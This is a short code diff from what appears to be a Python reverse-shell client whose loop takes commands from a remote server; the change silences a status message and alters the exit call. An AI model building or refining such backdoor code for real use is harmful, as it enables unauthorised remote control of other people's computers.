@@ -43,10 +43,10 @@ def shell(_s):
     while True:
         cmd = reliable_recv(_s)
         if cmd == 'q':
-            print('[-] Instruction to close sent from the server')
+            # print('[-] Instruction to close sent from the server')
             # print(colored('[-] Instruction to close sent from the server', 'red'))
             _s.close()
-            exit(1)
+            sys.exit(0)
             break
         elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
             try:
